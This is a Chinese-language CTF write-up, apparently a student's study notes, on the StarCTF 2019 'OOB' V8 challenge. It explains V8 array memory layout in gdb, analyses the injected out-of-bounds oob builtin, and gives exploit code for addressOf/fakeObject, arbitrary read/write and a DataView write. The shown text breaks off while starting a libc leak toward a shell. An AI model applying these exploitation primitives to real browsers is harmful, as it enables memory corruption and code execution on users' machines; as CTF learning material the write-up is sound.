---
title: StarCTF 2019 OOB
categories:
- StartCTF 2019
---

# StarCTF 2019 OOB

## 前言

最近想多尝试一下不同的东西，这道OOB的资料比较多(后来事实证明只需要看姚老板一人的博客就够了)，所以就花了两天调了一下，exp基本都是亦步亦趋地跟着学长写的，这篇博客算是读书笔记2333。

## 浏览器pwn常见形式

看师傅的总结一般有两种形式：出题人给个diff文件，里面有漏洞代码，给定一个漏洞版本的commit，编译前将源码reset到这个版本，再把diff文件apply上去，编译得到二进制文件d8。

## 编译d8

折腾环境可以先看下我之前的博客，其实总结一下就是想办法找个好代理后面就没什么大问题了，有谷歌云的也可以那边clone再scp回来不过比较麻烦。

```bash
git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598
git apply < oob.diff
# 同步模块
gclient sync
# 编译debug版本
tools/dev/v8gen.py x64.debug
ninja -C out.gn/x64.debug d8
# 编译release版本
tools/dev/v8gen.py x64.release
ninja -C out.gn/x64.release d8
```

编译出来的debug版本不能调用漏洞函数oob，只能在release中调用，而我们后面调试东西也不能在release中用job命令(这块很重要因为这个坑我编译了8.1的GDB= =)。所以我们主要是通过debug版本调试数据结构。


## 准备知识

### 调试工作

`allow-natives-syntax选项`，启动v8的时候设置这个选项，能定义一些v8运行时的支持函数，便于本地调试。一般gdb调试时先`gdb ./d8`，在gdb里设置参数`set args --allow-natives-syntax ./test.js`  
使用`%DebugPrint(var)`来输出变量var的详细信息，使用`%SystemBreak()`触发调试中断  
在编译后的目录下有个gdbinit，是v8官方团队给我们调试用的，在`~/.gdbinit`source一下那个文件以及目录下的`support-v8.py`，再重新加载一下gdbinit配置即可在`x64.debug`中调试  
常用的命令(本篇用到的)有`job`和`telescope addr [count]`，第一个命令可以可视化地显示Javascript对象的内存结构，第二个命令输出某个地址及之后count长度的内存数据  

### 调试测试

编写一个测试脚本test.js，内容如下：

```js
var a = [1.1,2.3,3.4,4.4];
%DebugPrint(a);
%SystemBreak();
var b = [1.1,2.2,3.3,4.4,5.5,6.6];
%DebugPrint(b);
%SystemBreak();
```

启动gdb调试d8，run之后看下，输出了a的信息,a作为一个JsArray对象，它的地址为`0x3bfd46c4de99`，注意这里的末位9，v8在内容中只有数字和对象两种表示，为了区分二者，v8在所有对象的内存地址的末尾加了1，表示其为一个对象，因此该对象的实际地址为`0x3bfd46c4de8`。

```bash
DebugPrint: 0x3bfd46c4de99: [JSArray]
 - map: 0x306548ac2ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x29277be11111 <JSArray[0]>
 - elements: 0x3bfd46c4de69 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x3f5b22f80c71 <FixedArray[0]> {
    #length: 0x0c7c939401a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x3bfd46c4de69 <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.3
           2: 3.4
           3: 4.4
 }
0x306548ac2ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x306548ac2e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x0c7c93940609 <Cell value= 1>
 - instance descriptors #1: 0x29277be11f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x29277be11eb9 <TransitionArray[4]>Transition array #1:
     0x3f5b22f84ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x306548ac2f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x29277be11111 <JSArray[0]>
 - constructor: 0x29277be10ec1 <JSFunction Array (sfi = 0xc7c9394aca1)>
 - dependent code: 0x3f5b22f802c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
```

我们用job查看一下对象的结构，可以看到对象的起始位置为map(PACKED_DOUBLE_ELEMENTS表明了它对象类型为这个)，实际存放浮点数组元素的地方在elements，我们用telescope查看elements处的元素

```bash
gdb-peda$ job 0x3bfd46c4de99
0x3bfd46c4de99: [JSArray]
 - map: 0x306548ac2ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x29277be11111 <JSArray[0]>
 - elements: 0x3bfd46c4de69 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x3f5b22f80c71 <FixedArray[0]> {
    #length: 0x0c7c939401a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x3bfd46c4de69 <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.3
           2: 3.4
           3: 4.4
 }
```

可以看到elements实际就在JsArray这个对象前面不远的地方，注意elemets也是一个对象(FixedDoubleArray)，实际的元素从`elments_addr+0x10`开始存储，这里多打了一个元素，即对象a开头的map，可以看到它就在实际存储元素的数组后面。

```
gdb-peda$ telescope 0x3bfd46c4de68 
0000| 0x3bfd46c4de68 --> 0x3f5b22f814f9 --> 0x3f5b22f801 
0008| 0x3bfd46c4de70 --> 0x400000000 
0016| 0x3bfd46c4de78 --> 0x3ff199999999999a 
0024| 0x3bfd46c4de80 --> 0x4002666666666666 
0032| 0x3bfd46c4de88 ("333333\v@\232\231\231\231\231\231\021@\331.\254He0")
0040| 0x3bfd46c4de90 --> 0x401199999999999a 
0048| 0x3bfd46c4de98 --> 0x306548ac2ed9 --> 0x400003f5b22f801 
0056| 0x3bfd46c4dea0 --> 0x3f5b22f80c71 --> 0x3f5b22f808

gdb-peda$ job 0x3bfd46c4de69
0x3bfd46c4de69: [FixedDoubleArray]
 - map: 0x3f5b22f814f9 <Map>
 - length: 4
           0: 1.1
           1: 2.3
           2: 3.4
           3: 4.4
gdb-peda$ p {double} 0x3bfd46c4de78
$1 = 1.1000000000000001
gdb-peda$ p {double} 0x3bfd46c4de80
$2 = 2.2999999999999998
gdb-peda$ p {double} 0x3bfd46c4de88
$3 = 3.3999999999999999
gdb-peda$ p {double} 0x3bfd46c4de90
$4 = 4.4000000000000004
gdb-peda$ p {double} 0x3bfd46c4de98
$5 = 2.6290008240713118e-310


```

为了对比，我们再找个对象数组(每个元素都是对象)调试查看

```js
var a = [1.1,2.3,3.4,4.4];
%DebugPrint(a);
%SystemBreak();
var b = [1.1,2.2,3.3,4.4,5.5,6.6];
%DebugPrint(b);
%SystemBreak();
var c = [a,b];
%DebugPrint(c);
%SystemBreak();
```

下面是a的信息，其对象地址为`0x15c096a4dee8`

```
DebugPrint: 0x15c096a4dee9: [JSArray]
 - map: 0x3ab385142ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3a008ae51111 <JSArray[0]>
 - elements: 0x15c096a4deb9 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x03e56e240c71 <FixedArray[0]> {
    #length: 0x2788f83801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x15c096a4deb9 <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.3
           2: 3.4
           3: 4.4
 }
0x3ab385142ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x3ab385142e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x2788f8380609 <Cell value= 1>
 - instance descriptors #1: 0x3a008ae51f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x3a008ae51eb9 <TransitionArray[4]>Transition array #1:
     0x03e56e244ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3ab385142f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x3a008ae51111 <JSArray[0]>
 - constructor: 0x3a008ae50ec1 <JSFunction Array (sfi = 0x2788f838aca1)>
 - dependent code: 0x03e56e2402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

```

continue，可以看到b的信息。其实际地址为`0x15c096a4df48`

```
DebugPrint: 0x15c096a4df49: [JSArray]
 - map: 0x3ab385142ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3a008ae51111 <JSArray[0]>
 - elements: 0x15c096a4df09 <FixedDoubleArray[6]> [PACKED_DOUBLE_ELEMENTS]
 - length: 6
 - properties: 0x03e56e240c71 <FixedArray[0]> {
    #length: 0x2788f83801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x15c096a4df09 <FixedDoubleArray[6]> {
           0: 1.1
           1: 2.2
           2: 3.3
           3: 4.4
           4: 5.5
           5: 6.6
 }
0x3ab385142ed9: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_DOUBLE_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x3ab385142e89 <Map(HOLEY_SMI_ELEMENTS)>
 - prototype_validity cell: 0x2788f8380609 <Cell value= 1>
 - instance descriptors #1: 0x3a008ae51f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x3a008ae51eb9 <TransitionArray[4]>Transition array #1:
     0x03e56e244ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_DOUBLE_ELEMENTS) -> 0x3ab385142f29 <Map(HOLEY_DOUBLE_ELEMENTS)>

 - prototype: 0x3a008ae51111 <JSArray[0]>
 - constructor: 0x3a008ae50ec1 <JSFunction Array (sfi = 0x2788f838aca1)>
 - dependent code: 0x03e56e2402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0

```

最后程序断到c处我们可以看到其地址为`0x15c096a4df88`,elements的内容是其成员对象的地址，而之前浮点数数组的elements就是它的成员浮点数本身。对比一下浮点数组和对象数组，会发现它们的结构很相似，都是在elements的后面紧接着map，不同的是我们输出floatArr[0]输出的是浮点数，objArr[0]输出的是第一个浮点数数组的全部内容，也就是对象的解析方式不同，在v8里，对象的解析情况由map的值表示，这个根据我们的调试也可以大致推测出来，不同对象数组的map值不同。

```
DebugPrint: 0x15c096a4df89: [JSArray]
 - map: 0x3ab385142f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x3a008ae51111 <JSArray[0]>
 - elements: 0x15c096a4df69 <FixedArray[2]> [PACKED_ELEMENTS]
 - length: 2
 - properties: 0x03e56e240c71 <FixedArray[0]> {
    #length: 0x2788f83801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x15c096a4df69 <FixedArray[2]> {
           0: 0x15c096a4dee9 <JSArray[4]>
           1: 0x15c096a4df49 <JSArray[6]>
 }
0x3ab385142f79: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x3ab385142f29 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x2788f8380609 <Cell value= 1>
 - instance descriptors #1: 0x3a008ae51f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x3a008ae51f19 <TransitionArray[4]>Transition array #1:
     0x03e56e244ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x3ab385142fc9 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x3a008ae51111 <JSArray[0]>
 - constructor: 0x3a008ae50ec1 <JSFunction Array (sfi = 0x2788f838aca1)>
 - dependent code: 0x03e56e2402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0


 gdb-peda$ telescope 0x15c096a4df68
0000| 0x15c096a4df68 --> 0x3e56e240801 --> 0x3e56e2401 
0008| 0x15c096a4df70 --> 0x200000000 
0016| 0x15c096a4df78 --> 0x15c096a4dee9 --> 0x7100003ab385142e 
0024| 0x15c096a4df80 --> 0x15c096a4df49 --> 0x7100003ab385142e 
0032| 0x15c096a4df88 --> 0x3ab385142f79 --> 0x4000003e56e2401 
0040| 0x15c096a4df90 --> 0x3e56e240c71 --> 0x3e56e2408 
0048| 0x15c096a4df98 --> 0x15c096a4df69 --> 0x3e56e2408 
0056| 0x15c096a4dfa0 --> 0x200000000 
gdb-peda$ job 0x15c096a4dee9
0x15c096a4dee9: [JSArray]
 - map: 0x3ab385142ed9 <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x3a008ae51111 <JSArray[0]>
 - elements: 0x15c096a4deb9 <FixedDoubleArray[4]> [PACKED_DOUBLE_ELEMENTS]
 - length: 4
 - properties: 0x03e56e240c71 <FixedArray[0]> {
    #length: 0x2788f83801a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x15c096a4deb9 <FixedDoubleArray[4]> {
           0: 1.1
           1: 2.3
           2: 3.4
           3: 4.4
 }
```

我们尝试在gdb中直接修改内存数据，即将对象数组的map强制修改为浮点数组的，并且输出c[0],测试代码如下:

```js
var a = [1.1,2.3,3.4,4.4];
%DebugPrint(a);
%SystemBreak();
var b = [1.1,2.2,3.3,4.4,5.5,6.6];
%DebugPrint(b);
%SystemBreak();
var c = [a,b];
console.log(c[0]);
%DebugPrint(c);
%SystemBreak();
```

一直走到从c，中间记录下floatArr的map为`0x3a73fe2c2ed9`,对象数组的map为`0x3a73fe2c2f79`

```
1.1,2.3,3.4,4.4
DebugPrint: 0x9fc4aa0dfc9: [JSArray]
 - map: 0x3a73fe2c2f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x373fc5a91111 <JSArray[0]>
 - elements: 0x09fc4aa0dfa9 <FixedArray[2]> [PACKED_ELEMENTS]
 - length: 2
 - properties: 0x04366f840c71 <FixedArray[0]> {
    #length: 0x066f341401a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x09fc4aa0dfa9 <FixedArray[2]> {
           0: 0x09fc4aa0df29 <JSArray[4]>
           1: 0x09fc4aa0df89 <JSArray[6]>
 }
0x3a73fe2c2f79: [Map]
 - type: JS_ARRAY_TYPE
 - instance size: 32
 - inobject properties: 0
 - elements kind: PACKED_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - back pointer: 0x3a73fe2c2f29 <Map(HOLEY_DOUBLE_ELEMENTS)>
 - prototype_validity cell: 0x066f34140609 <Cell value= 1>
 - instance descriptors #1: 0x373fc5a91f49 <DescriptorArray[1]>
 - layout descriptor: (nil)
 - transitions #1: 0x373fc5a91f19 <TransitionArray[4]>Transition array #1:
     0x04366f844ba1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_ELEMENTS) -> 0x3a73fe2c2fc9 <Map(HOLEY_ELEMENTS)>

 - prototype: 0x373fc5a91111 <JSArray[0]>
 - constructor: 0x373fc5a90ec1 <JSFunction Array (sfi = 0x66f3414aca1)>
 - dependent code: 0x04366f8402c1 <Other heap object (WEAK_FIXED_ARRAY_TYPE)>
 - construction counter: 0


Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.

gdb-peda$ telescope 0x09fc4aa0dfa8
0000| 0x9fc4aa0dfa8 --> 0x4366f840801 --> 0x4366f8401 
0008| 0x9fc4aa0dfb0 --> 0x200000000 
0016| 0x9fc4aa0dfb8 --> 0x9fc4aa0df29 --> 0x7100003a73fe2c2e 
0024| 0x9fc4aa0dfc0 --> 0x9fc4aa0df89 --> 0x7100003a73fe2c2e 
0032| 0x9fc4aa0dfc8 --> 0x3a73fe2c2f79 --> 0x4000004366f8401 
0040| 0x9fc4aa0dfd0 --> 0x4366f840c71 --> 0x4366f8408 
0048| 0x9fc4aa0dfd8 --> 0x9fc4aa0dfa9 --> 0x4366f8408 
0056| 0x9fc4aa0dfe0 --> 0x200000000 

gdb-peda$  set {double} 0x9fc4aa0dfc8 = 0x3a73fe2c2ed9

```

最后job一下变成了`PACKED_ELEMENTS`。注意之前我set用的类型是int所以后面失败了，下面的结果是我第二次跑的结果，因此跟上面的地址有出入，懒得再重复一遍了233，

```bash
0x3f98aecdfc9: [JSArray]
 - map: 0x016507e42f79 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x3be78da51111 <JSArray[0]>
 - elements: 0x03f98aecdfa9 <FixedArray[2]> [PACKED_ELEMENTS]
 - length: 2
 - properties: 0x0c1e92c80c71 <FixedArray[0]> {
    #length: 0x2dbc933401a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x03f98aecdfa9 <FixedArray[2]> {
           0: 0x03f98aecdf29 <JSArray[4]>
           1: 0x03f98aecdf89 <JSArray[6]>
 }

```

所以最后再输出arr[0]，实际输出的是对象的地址。

### 小结v8对象结构

通过上述调试过程我们看到一个对象在内存的大致布局如下：  
map	表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型  
prototype	prototype  
elements	对象元素  
length	元素个数  
properties	属性  

而浮点数组和对象数组又有下面类似的结构(注意其他类型的Array和它相似但不完全相同)

```
  elements  ----> +------------------------+
                   |          MAP           +<---------+
                   +------------------------+          |
                   |      element 1         |          |
                   +------------------------+          |
                   |      element 2         |          |
                   |      ......            |          |
                   |      element n         |          |
 ArrayObject  ---->-------------------------+          |
                   |      map               |          |
                   +------------------------+          |
                   |      prototype         |          |
                   +------------------------+          |
                   |      elements          |          |
                   |                        +----------+
                   +------------------------+
                   |      length            |
                   +------------------------+
                   |      properties        |
                   +------------------------+
```

## 漏洞分析

查看给定的diff文件，开始注册了一个函数oob，内部表示为kArrayOob。

```c++
diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc
index b027d36..ef1002f 100644
--- a/src/bootstrapper.cc
+++ b/src/bootstrapper.cc
@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle<JSGlobalObject> global_object,
                           Builtins::kArrayPrototypeCopyWithin, 2, false);
     SimpleInstallFunction(isolate_, proto, "fill",
                           Builtins::kArrayPrototypeFill, 1, false);
+    SimpleInstallFunction(isolate_, proto, "oob",
+                          Builtins::kArrayOob,2,false);
     SimpleInstallFunction(isolate_, proto, "find",
                           Builtins::kArrayPrototypeFind, 1, false);
     SimpleInstallFunction(isolate_, proto, "findIndex",
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 8df340e..9b828ab 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,
   return *final_length;
 }
 }  // namespace
```

之后给出oob函数的具体实现：

```cpp
+BUILTIN(ArrayOob){
+    uint32_t len = args.length();
+    if(len > 2) return ReadOnlyRoots(isolate).undefined_value();
+    Handle<JSReceiver> receiver;
+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+            isolate, receiver, Object::ToObject(isolate, args.receiver()));
+    Handle<JSArray> array = Handle<JSArray>::cast(receiver);
+    FixedDoubleArray elements = FixedDoubleArray::cast(array->elements());
+    uint32_t length = static_cast<uint32_t>(array->length()->Number());
+    if(len == 1){
+        //read
+        return *(isolate->factory()->NewNumber(elements.get_scalar(length)));
+    }else{
+        //write
+        Handle<Object> value;
+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
+                isolate, value, Object::ToNumber(isolate, args.at<Object>(1)));
+        elements.set(length,value->Number());
+        return ReadOnlyRoots(isolate).undefined_value();
+    }
+}
```

最后将kArrayOob类型同实现函数关联起来

```cpp
@@ -368,6 +368,7 @@ namespace internal {
   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \
   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \
+  CPP(ArrayOob)                                                                \
                                                                                \
   /* ArrayBuffer */                                                            \
   /* ES #sec-arraybuffer-constructor */                                        \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index ed1e4a5..c199e3a 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtins::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+    case Builtins::kArrayOob:
+      return Type::Receiver();
 
     // ArrayBuffer functions.
     case Builtins::kArrayBufferIsView:
```

可以看到具体逻辑在第二部分，其增加的函数oob先判断用户输入参数的个数，参数个数为1时，读取arr[length]，否则将用户输入参数的第二个参数赋值给arr[length]，注意上述参数个数为c++中的参数个数。  
因为c++成员函数的第一个参数一定是this指针，所以上述函数的逻辑是调用oob参数为0时输出arr[length]的内容，否则将第一个参数写入到arr[length]的位置。

### oob函数

脚本如下：

```js
var a = [1.1,2,3,4,5,6,7,8];
var data = a.oob()
console.log("[*] oob return data:" + data.toString());
a.oob(2);
```

因为我们不能用debug调用oob，又不能在release里用job，所以这里直接分析漏洞，数组的长度为length，元素下标从[0,length-1]，这里可以输出和修改arr[length]为数组越界读写。  

## 漏洞利用

有了这个数组越界漏洞，我们要怎样利用呢？下面就牵扯到类型混淆(type confusion)漏洞。根据我们刚才的调试可以发现v8解析一个对象的时候是根据其map值来确定对象属性的，在刚才的浮点数数组对象和对象数组对象的对比中，一旦我们成功将对象数组的map修改成浮点数数组的map值，就可以成功让v8以浮点数数组对象的方式对其进行解析，此时我们输出obj_arr[0]本应输出第一个对象的值，修改之后输出的确实其对象地址，达到读取对象地址的目的。  
同样的，如果我们想将一块内存地址以对象的形式解析，我们可以将这个地址放到float_arr里，再将float_arr的map改成对象数组的map，即可让原本是浮点数元素的这个内存地址以对象的形式被解析。也就是说我们可以伪造一个对象。  


## 编写addressOf和fakeObject

首先定义两个全局的Float数组和对象数组，利用oob函数泄露两个数组的Map类型:
```js
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
​
var obj_array_map = obj_array.oob();
var float_array_map = float_array.oob();
```

下面实现两个函数

`addressOf`泄露给定对象的地址，其中f2i是float2int，1n表示BigNumber

```js
function addressOf(obj)
{
    obj_arr[0] = obj;
    obj_arr.oob(float_array_map);//convert to float_arr
    let obj_addr =  f2i(obj_arr[0]-1n);
    obj_arr.oob(obj_array_map);
    return obj_addr;
}
function fakeObject(addr_to_fake)
{
    float_arr[0] = i2f(addr_to_fake+1n);
    float_arr.oob(obj_array_map);
    let fake_obj = float_addr[0];
    float_addr.oob(float_array_map);
    return fake_obj;
}
```

编写辅助函数

```js
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}
```

注意v8会给内存地址+1，所以泄露object地址的时候要将输出结果-1。  
同样在构造fake_obj的时候内存中存储的地址为addr+1,得到的obj是一个对象，就不必有什么+-操作了。

## 构造地址任意读写

有了这俩函数怎么构造地址任意读写呢？下面就得结合上面v8对象内存布局来看：

```
 ArrayObject  ---->-------------------------+          
                   |      map               |          
                   +------------------------+          
                   |      prototype         |          
                   +------------------------+          
                   |      elements 指针      |          
                   |                        +
                   +------------------------+
                   |      length            |
                   +------------------------+
                   |      properties        |
                   +------------------------+
```

如果我们在一块内存上部署了上述虚假的内存属性，比如map，prototype,elements指针、length、properties属性，我们就可以用fakeObject把这块内存强制伪造成一个数组对象。  
我们构造的这个对象的elements指针是可以控制的，如果我们将这个指针修改成我们想要访问的内存地址，那后续我们访问这个数组对象的内容，实际上就是访问我们修改后的内存地址指向的内容，这样也就实现了对任意指定地址的内容访问读写效果了。  

下面是具体的构造：

我们首先创建一个float数组对象fake_array，可以用addressOf泄露fake_array对象的地址，然后根据elements对象与fake_object的内存偏移，可以得出elements地址= addressOf(fake_object) - (0x10 + n * 8)(n为元素个数)，而elements+0x10为实际存储元素的位置。  
我们提前将fake_object构造为如下的形式：

```js
var fake_array = [
    float_array_map,//fake to be a float arr object
    i2f(0n),
    i2f(0x41414141n),//fake obj's elements ptr
    i2f(0x1000000000n),
    1.1,
    2.2
];
```

则我们可以通过addressOf(fake_array)-0x30计算得到存储数组元素内容的地址，然后使用fakeObject将这个地址转换为对象fake_obj，之后我们访问fake_obj[0]，实际上访问的就是0x41414141+0x10的内容(注意实际的元素存储在elements+0x10处)。  
下面是地址任意读写的实现：
```js
var fake_array = [
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),//fake obj's elements ptr
    i2f(0x1000000000n),
    1.1,
    2.2
];

var fake_arr_addr = addressOf(fake_array);
var fake_object_addr = fake_arr_addr - 0x40n + 0x10n;
var fake_object = fakeObject(fake_object_addr);

//randomRead

function read64(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    //console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));
    return leak_data;
}

function write64(addr,data)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);
    //console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}
```

测试代码可以发现已经能任意读写。

```js
var a = [1.1,2.2,3.3];
%DebugPrint(a);
var a_addr = addressOf(a);
console.log("[*] addressOf a: 0x" + hex(a_addr));

read64(a_addr);
%SystemBreak();

write64(a_addr,0x01020304n);
%SystemBreak();
```

看到已经成功写入了数据

```bash
0x238dc518f799 <JSArray[3]>
[*] addressOf a: 0x0000238dc518f798

Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
gdb-peda$ telescope 0x238dc518f798
0000| 0x238dc518f798 --> 0x1020304 
0008| 0x238dc518f7a0 --> 0x3840a5e40c71 --> 0x3840a5e408 
0016| 0x238dc518f7a8 --> 0x238dc518f771 --> 0x3840a5e414 
0024| 0x238dc518f7b0 --> 0x300000000 
0032| 0x238dc518f7b8 --> 0x3840a5e40561 --> 0x200003840a5e401 
0040| 0x238dc518f7c0 --> 0x238dc518f799 --> 0x7100000000010203 
0048| 0x238dc518f7c8 --> 0x3840a5e413b9 --> 0x3840a5e401 
0056| 0x238dc518f7d0 --> 0x2 
```

这里的任意地址写在写高地址的时候会出现问题，地址的低位会被修改出现异常，这里有另一个方式解决这个问题。  
DataView对象中的backing_store会指向申请的data_buf，修改backing_store为我们想要写的地址，用DataView对象的setBigUint64方法就可以往指定地址写数据了。

```js
var data_buf = new ArrayBuffer(8);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;

function writeDataview(addr,data){
    write64(buf_backing_store_addr,addr);
    data_view.setBigUint64(0,data,true);
    console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));
}
```

## 正常Pwn题get shell

正常我们获取shell的方法要先泄露libc之后改__free_hook为one_gadget等。  
这里泄露libc的方式有两种，分别是稳定泄露和不稳定泄露，稳定的方式我试了下也和姚老板一样没整出来(ubuntu 16.04),这里只讲下不稳定泄露。

任意创建一个数组，输出数组地址，往前搜索内存会发现在前面0xd000多的地方有程序的地址，由此可以算出程序基址，之后用got表泄露libc，改__free_hook即可get shell。  

```js
var a = [1.1,2.2,3.3];
%DebugPrint(a);
%SystemBreak();
```
查看d8地址之后搜索，选一个地址比较高的查看一下(exp是写这篇博客前写的，所以当时选的是另一个地址，exp里有出入)  
```bash
0x3a9ed418ddb9 <JSArray[3]>

Thread 1 "d8" received signal SIGTRAP, Trace/breakpoint trap.
gdb-peda$ vmmap d8
Start              End                Perm      Name
0x000055df6dd59000 0x000055df6dfec000 r--p      /home/wz/v8/v8/out.gn/x64.release/d8
0x000055df6dfec000 0x000055df6eab4000 r-xp      /home/wz/v8/v8/out.gn/x64.release/d8
0x000055df6eab4000 0x000055df6eaf4000 r--p      /home/wz/v8/v8/out.gn/x64.release/d8
0x000055df6eaf4000 0x000055df6eafe000 rw-p      /home/wz/v8/v8/out.gn/x64.release/d8

gdb-peda$ find 0x55df6d
Searching for '0x55df6d' in: None ranges
Found 17809 results, display max 256 items:
mapped : 0x3a9ed418016b --> 0x181f49000055df6d 
mapped : 0x3a9ed4180193 --> 0x180b71000055df6d 
mapped : 0x3a9ed41801a3 --> 0x180801000055df6d 
mapped : 0x3a9ed41802a3 --> 0x180b71000055df6d 
mapped : 0x3a9ed41802b3 --> 0x181f49000055df6d 
mapped : 0x3a9ed41802db --> 0x180b71000055df6d 
mapped : 0x3a9ed41802eb --> 0x181f49000055df6d 
mapped : 0x3a9ed4180313 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180323 --> 0x181f49000055df6d 
mapped : 0x3a9ed4180353 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180363 --> 0x181f49000055df6d 
mapped : 0x3a9ed418038b --> 0x180b71000055df6d 
mapped : 0x3a9ed418039b --> 0x181f49000055df6d 
mapped : 0x3a9ed41803c3 --> 0x180b71000055df6d 
mapped : 0x3a9ed41803d3 --> 0x180801000055df6d 
mapped : 0x3a9ed4180583 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180593 --> 0x181f49000055df6d 
mapped : 0x3a9ed41805bb --> 0x180b71000055df6d 
mapped : 0x3a9ed41805cb --> 0x181f49000055df6d 
mapped : 0x3a9ed418061b --> 0x180b71000055df6d 
mapped : 0x3a9ed418062b --> 0x180801000055df6d 
mapped : 0x3a9ed4180733 --> 0x180b71000055df6d 
mapped : 0x3a9ed4180743 --> 0x181f49000055df6d 
